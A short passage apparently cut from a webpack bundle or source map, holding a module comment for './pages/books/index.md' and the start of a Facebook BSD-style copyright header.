./pages/books/index.md\n// module id = 509\n// module chunks = 0","/**\n * Copyright 2013-present, Facebook, Inc.\n * All rights reserved.\n *\n * This source code is licensed under the BSD-style license found in the\n * LICENSE file in the root directory of this source tree.
